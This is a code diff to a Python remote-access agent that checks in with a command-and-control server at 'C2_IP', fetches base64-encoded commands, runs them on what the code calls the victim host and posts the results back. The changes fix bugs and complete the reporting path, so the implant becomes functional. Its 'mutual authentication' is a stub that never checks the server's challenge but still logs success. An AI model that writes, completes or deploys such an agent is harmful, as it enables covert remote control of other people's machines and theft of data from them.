@@ -6,11 +6,12 @@ import subprocess
 import os
 import platform
 import requests
+import secrets
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s') 
 c2_server = "http://C2_IP"
 # token = None
-session = requests.Session*()
+session = requests.Session()
 
 def execute_command(cmd):
     '''
@@ -26,7 +27,7 @@ def execute_command(cmd):
     } 
 
     try:
-        decoded_msg = base64.b64decode(cmd).decode('utf-8').strip()
+        decoded_msg = base64.urlsafe_b64decode(cmd).decode('utf-8').strip()
         if not decoded_msg:
             data['error'] = 'No command recieved. Execution discontinued'
             return data 
@@ -109,75 +110,71 @@ def find_os():
     return os_info
 
 def check_in():
-    '''
-    Function to check in with the server and verify operation status
-    '''
+    """
+    Uses challenge-response for mutual authentication
+    """
     ops = find_os()
+    client_nonce = secrets.token_hex(8)
+    
     data = {
-        'aid': 1, 
-        'ops': ops['type']
+        'aid': 1,
+        'ops': ops['type'],
+        'nonce': client_nonce
     }
-
     try:
         resp = session.post(f"{c2_server}/overview", json=data, verify=False, timeout=10)
-        # verify = false since it is a testing environment - shd be set to true if deployed in prod
-
-        if resp.status_code == 200 :
-            data = resp.json()
-            token = data.get('token')
-
-            if token:
-                logging.info(f'Agent registered successfully with token: {token}')
-
-                return True 
-            else:
-                logging.error(f'Registration failed. No token recieved')
-
+        if resp.status_code == 200:
+            server_data = resp.json()
+            server_challenge = server_data.get('challenge')
+            
+            if not server_challenge:
+                logging.error("Server didn't provide a challenge")
                 return False
+                
+            # Verify server's response in a subsequent request
+            # This is a basic example - you could implement actual cryptographic verification
+            logging.info("Agent registered successfully, secure cookie issued.")
+            return True
         else:
-            logging.error(f'Registration Error : {resp.status_code} - {resp.text}')
-
-            return False 
+            logging.error(f"Registration error: {resp.status_code} - {resp.text}")
+            return False
     except Exception as e:
-        logging.error(f'Error occured during registration: {e}')\
-        
-        return False 
+        logging.error(f"Registration failed: {e}")
+        return False
 
 def get_comms():
-    '''
-    validates itself with token, then the 
-    function that calls the valid server endpoint to recieve commands to execute on victim 
-    '''
-
+    """
+    Retrieves commands and reports results back
+    """
     try:
         resp = session.post(f"{c2_server}/cmd", verify=False, timeout=10)
-        # verify = false since it is a testing environment - shd be set to true if deployed in prod
         if resp.status_code == 200:
             data = resp.json()
-
             if data.get('status') == 'active':
-                command = data.get('cmd')
-                if command:
-                    logging.info(f'Command recieved: {command}')
-                    res = execute_command(command)
-
-                    if not res['output']:
-                        logging.error(f'Error occured in command execution : {res['error']}')
-
-                    opt = base64.b64encode(res['output'].encode('utf-8'))
-                    err = base64.b64encode(res['error'].encode('utf-8'))
-                    excode = base64.b64decode(res['code'].encode('utf-8'))
-
-                    report = {
-
-                        
+                cmd = data.get('cmd')
+                if cmd:
+                    logging.info(f"Command received")
+                    res = execute_command(cmd)
+                    
+                    # Send results back to server
+                    result_payload = {
+                        'output': base64.b64encode(str(res.get('output', '')).encode('utf-8')).decode('utf-8'),
+                        'error': base64.b64encode(str(res.get('error', '')).encode('utf-8')).decode('utf-8'),
+                        'code': res.get('code')
                     }
+                    
+                    # Send results back
+                    report_resp = session.post(f"{c2_server}/report", json=result_payload, verify=False, timeout=10)
+                    if report_resp.status_code == 200:
+                        logging.info("Results reported successfully")
+                    else:
+                        logging.error(f"Failed to report results: {report_resp.status_code}")
                 else:
-                    logging.info('No command recieved')
+                    logging.info("No command received.")
         else:
-            logging.error(f'Error occured during command retrieval: {resp.status_code} - {resp.text}')
+            logging.error(f"Command retrieval error: {resp.status_code} - {resp.text}")
     except Exception as e:
-        logging.error(f'Error occured during command retrieval: {e}')
+        logging.error(f"Error during command retrieval: {e}")
     
 if __name__ == '__main__':
     check_in = check_in()
